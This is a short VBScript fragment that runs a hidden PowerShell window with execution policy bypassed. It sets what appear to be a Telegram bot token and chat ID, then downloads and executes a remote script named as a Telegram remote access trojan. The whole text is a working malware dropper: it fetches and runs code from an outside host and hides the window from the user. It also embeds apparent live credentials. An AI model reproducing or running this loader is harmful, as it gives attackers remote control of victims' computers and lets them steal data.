...
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $tg='6054248887:AAF5R1blIasBLvUlMB5C7fyJwh1rpNY_3WI';$cid='5522861607'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-RAT-Func.ps1 | iex", 0, True
'@
